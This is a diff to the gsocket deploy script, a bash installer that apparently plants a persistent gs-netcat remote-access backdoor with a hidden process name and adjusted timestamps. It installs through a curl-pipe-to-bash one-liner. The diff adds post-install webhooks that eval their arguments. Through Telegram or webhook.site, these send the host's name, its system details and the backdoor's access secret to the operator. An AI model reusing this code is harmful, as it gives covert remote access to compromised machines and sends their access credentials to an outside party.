@@ -47,12 +47,37 @@
 #       - Specify custom hidden name for process
 # GS_DL=wget
 #       - Command to use for download. =wget or =curl
+# GS_TG_TOKEN
+#       - Telegram Bot ID, =5794110125:AAFDNb...
+# GS_TG_CHATID
+#        - Telegram Chat ID, =-8834838383
 # TMPDIR=
 #       - Guess what...
 
 # Global Defines
-# URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
-URL_BASE="https://gsocket.io/bin/"
+# URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin"
+URL_BASE="https://www.gsocket.io/bin"
+[[ -n $GS_URL_BASE ]] && URL_BASE="${GS_URL_BASE}"
+# WEBHOOKS are executed after a successfull install
+# 1. Need a URL for WGET and CURL
+# 2. Escape all '&' with '\&'
+### Telegram example
+GS_TG_TOKEN=""
+GS_TG_CHATID=""
+[[ -n $GS_TG_TOKEN ]] && [[ -n $GS_TG_CHATID ]] && {
+	msg="\$(hostname) --- \$(uname -rom) --- gs-netcat -i -s \${GS_SECRET}"
+	GS_WEBHOOK_CURL=("--data-urlencode" "text=\"${msg}\"" "https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}\&parse_mode=html")
+	GS_WEBHOOK_WGET=("https://api.telegram.org/bot${GS_TG_TOKEN}/sendMessage?chat_id=${GS_TG_CHATID}\&parse_mode=html\&text=${msg}")
+	unset msg
+}
+### webhook.site example
+# GS_WEBHOOK_CURL=("-duser=foo2" '-dpassword=${GS_SECRET}' "https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276")
+# GS_WEBHOOK_WGET=("--post-data" 'user=foo\&password=${GS_SECRET}' "https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276")
+### A complex example:
+# GS_WEBHOOK_CURL=("curl" "-X" "POST" 'https://webhook.site/dc3c1af9-ea3d-4401-9158-eb6dda735276' \
+# 		"-H" "content-type: application/json" \
+# 		"-d" '$'\''{"id": 7, "name": "Jack Daniels", "position": "Assistant"}'\''')
+
 [[ -n "$GS_URL_BASE" ]] && URL_BASE="$GS_URL_BASE" # Use user supplied URL_BASE
 URL_DEPLOY="gsocket.io/x"
 # GS_VERSION=1.4.34
@@ -158,8 +183,6 @@ ts_is_marked()
 
 	return 1 # False
 }
-
-
 
 # There are some files which need TimeStamp update after all other TimeStamps
 # have been fixed. Noteable /etc/systemd/system/multi-user.target.wants
@@ -663,6 +686,32 @@ init_vars()
 
 	[[ -n $pids ]] && OLD_PIDS="${pids//$'\n'/ }" # Convert multi line into single line
 
+	# DL_CMD is used for help output of how to uninstall
+	if [[ -n "$GS_USELOCAL" ]]; then
+		DL_CMD="./deploy-all.sh"
+	elif command -v curl >/dev/null; then
+		DL_CMD="$DL_CRL"
+	elif command -v wget >/dev/null; then
+		DL_CMD="$DL_WGT"
+	else
+		# errexit "Need curl or wget."
+		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
+		errexit
+	fi
+
+	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
+	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
+	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
+		IS_USE_CURL=1
+		DL=("curl" "-fsL" "--connect-timeout" "5" "-m30" "--retry" "3")
+		[[ -n $GS_DEBUG ]] && DL+=("-v")
+	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
+		IS_USE_WGET=1
+		DL=("wget" "-qO-")
+	else
+		DL=("false")   # Should not happen
+	fi
+
 	DEBUGF "OLD_PIDS='$OLD_PIDS'"
 	DEBUGF "SRC_PKG=$SRC_PKG"
 }
@@ -1151,25 +1200,7 @@ dl_ssl()
 # Download $1 and save it to $2
 dl()
 {
-	local arr
 	[[ -s "$2" ]] && return
-
-	# Need to set DL_CMD before GS_DEBUG check for proper error output
-	# DL_CMD is used for help output of how to uninstall
-	if [[ -n "$GS_USELOCAL" ]]; then
-		DL_CMD="./deploy-all.sh"
-	elif command -v curl >/dev/null; then
-		DL_CMD="$DL_CRL"
-	elif command -v wget >/dev/null; then
-		DL_CMD="$DL_WGT"
-	else
-		# errexit "Need curl or wget."
-		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
-		errexit
-	fi
-
-	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
-	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
 
 	# Debugging / testing. Use local package if available
 	if [[ -n "$GS_USELOCAL" ]]; then
@@ -1178,17 +1209,10 @@ dl()
 		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
 		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
 		errexit
-	fi
-	[[ -n "$GS_USELOCAL" ]] && return # NOT REACHED
-
-	# HERE: It's either wget or curl (but not GS_USELOCAL)
-	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
-		arr=("-fL" "-m5" "--retry" "3" "${URL_BASE}/${1}" "--output" "${2}")
-		[[ -n $GS_DEBUG ]] && arr+=("-v")
-		dl_ssl "-k" "certificate problem" "curl" "${arr[@]}"
-	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
-		arr=("${URL_BASE}/${1}" "-O" "${2}")
-		dl_ssl "--no-check-certificate" "is not trusted" "wget" "${arr[@]}"
+	elif [[ -n $IS_USE_CURL ]]; then
+		dl_ssl "-k" "certificate problem" "${DL[@]}" "${URL_BASE}/${1}" "--output" "${2}"
+	elif [[ -n $IS_USE_WGET ]]; then
+		dl_ssl "--no-check-certificate" "is not trusted" "${DL[@]}" "${URL_BASE}/${1}" "-O" "${2}"
 	else
 		# errexit "Need curl or wget."
 		FAIL_OUT "CAN NOT HAPPEN"
@@ -1320,9 +1344,47 @@ test_network()
 	WARN_EXECFAIL_SET "$ret" "default pkg failed"
 }
 
+do_webhook()
+{
+	local arr
+	local i
+	local IFS
+	i=0
+
+	IFS=""
+	# Substitude any $SECRET variable etc.
+	while [[ $# -gt 0 ]]; do
+		arr+=($(eval echo "$1"))
+		shift 1
+		((i++))
+	done
+
+	"${arr[@]}" >/dev/null
+}
+
+webhooks()
+{
+	local arr
+	local ok
+
+	[[ -n ${GS_WEBHOOK_CURL[0]} ]] && ok=1
+	[[ -n ${GS_WEBHOOK_WGET[0]} ]] && ok=1
+
+	echo -en "Executing webhooks...................................................."
+	[[ -z $ok ]] && { SKIP_OUT; return; }
+
+	if [[ -n $IS_USE_CURL ]]; then
+		[[ -n ${GS_WEBHOOK_CURL[0]} ]] && { do_webhook "${DL[@]}" "${GS_WEBHOOK_CURL[@]}" || unset ok; }
+	elif [[ -n $IS_USE_WGET ]]; then
+		[[ -n ${GS_WEBHOOK_WGET[0]} ]] && { do_webhook "${DL[@]}" "${GS_WEBHOOK_WGET[@]}" || unset ok; }
+	fi
+	[[ -n $ok ]] && { OK_OUT; return; }
+
+	FAIL_OUT
+}
+
 try_network()
 {
-	DEBUGF "GS_SECRET2=${GS_SECRET}"
 	echo -en "Testing Global Socket Relay Network..................................."
 	test_network
 	if [[ -n "$IS_TESTNETWORK_OK" ]]; then
@@ -1474,7 +1536,6 @@ init_setup
 # User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
-
 if [[ -z $S ]]; then
 	if [[ $UID -eq 0 ]]; then
 		gs_secret_reload "$SYSTEMD_SEC_FILE" 
@@ -1527,6 +1588,8 @@ if [[ -z "$IS_INSTALLED" || -n $IS_DSTBIN_TMP ]]; then
 fi
 	
 [[ -n $IS_DSTBIN_CWD ]] && WARN "Installed to ${PWD}. Try GS_DSTDIR= otherwise.."
+
+webhooks
 
 HOWTO_CONNECT_OUT
 
